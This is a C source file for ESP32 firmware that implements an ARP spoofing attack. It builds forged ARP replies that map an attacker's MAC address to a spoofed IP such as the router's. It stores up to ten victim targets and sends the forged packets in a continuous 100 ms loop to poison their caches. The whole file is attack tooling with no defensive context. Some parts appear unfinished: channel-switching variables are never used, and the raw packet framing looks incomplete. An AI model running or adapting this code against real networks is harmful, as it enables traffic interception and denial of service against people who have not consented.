#include "vendor/arp_spoof.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <arpa/inet.h>

static const char *TAG = "ARP_SPOOF";

#define MAX_TARGETS 10
static arp_spoof_config_t targets[MAX_TARGETS];
static int num_targets = 0;
static bool spoofing_active = false;


void craft_arp_reply(arp_packet_t *packet, const arp_spoof_config_t *config) {
    packet->htype = htons(1); // Ethernet
    packet->ptype = htons(0x0800); // IPv4
    packet->hlen = 6; // MAC address length
    packet->plen = 4; // IP address length
    packet->oper = htons(2); // ARP reply

    // Fill in the packet fields
    memcpy(packet->sha, config->attacker_mac, 6);  // Attacker MAC address
    memcpy(packet->spa, config->spoof_ip, 4);      // Spoofed IP (e.g., router IP)
    memcpy(packet->tha, config->target_mac, 6);    // Target MAC address (victim MAC)
    memcpy(packet->tpa, config->target_ip, 4);     // Target IP address (victim IP)
}


void send_arp_packet(const arp_packet_t *packet) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(arp_packet_t), false);
    if (result != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send ARP packet: %s", esp_err_to_name(result));
    } else {
    }
}


void init_arp_spoof(arp_spoof_config_t *config, int num_new_targets) {
    if (num_targets + num_new_targets > MAX_TARGETS) {
        ESP_LOGE(TAG, "Cannot add more targets. Maximum limit reached.");
        return;
    }

    if (num_new_targets == 0)
    {
        spoofing_active = true;

        ESP_LOGI(TAG, "Initialized ARP spoofing with %d targets", num_new_targets);

        return;
    }

    memcpy(&targets[num_targets], config, num_new_targets * sizeof(arp_spoof_config_t));
    num_targets += num_new_targets;
    spoofing_active = true;

    ESP_LOGI(TAG, "Initialized ARP spoofing with %d targets", num_new_targets);
}


void add_target(const uint8_t *target_ip, const uint8_t *target_mac, const uint8_t *spoof_ip) {
    if (num_targets >= MAX_TARGETS) {
        ESP_LOGE(TAG, "Cannot add more targets. Maximum limit reached.");
        return;
    }

    
    arp_spoof_config_t new_target;
    memcpy(new_target.target_ip, target_ip, 4);
    memcpy(new_target.target_mac, target_mac, 6);
    memcpy(new_target.spoof_ip, spoof_ip, 4);
    esp_wifi_get_mac(ESP_IF_WIFI_STA, new_target.attacker_mac);

    targets[num_targets] = new_target;
    num_targets++;
    
    ESP_LOGI(TAG, "Added new target for ARP spoofing: IP %d.%d.%d.%d", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
}


void arp_spoof_task(void *pvParameter) {
    arp_packet_t arp_packet;
    int current_channel = 1;
    const int max_channel = 13;
    const int channel_switch_interval = 5000;

    TickType_t last_channel_switch_time = xTaskGetTickCount();

    while (spoofing_active) {
        for (int i = 0; i < num_targets; i++) {
            craft_arp_reply(&arp_packet, &targets[i]);
            send_arp_packet(&arp_packet);
        }

        vTaskDelay(pdMS_TO_TICKS(100));
    }

    vTaskDelete(NULL);
}

// Function to stop ARP spoofing
void stop_arp_spoof() {
    spoofing_active = false;
    ESP_LOGI(TAG, "Stopped ARP spoofing");
}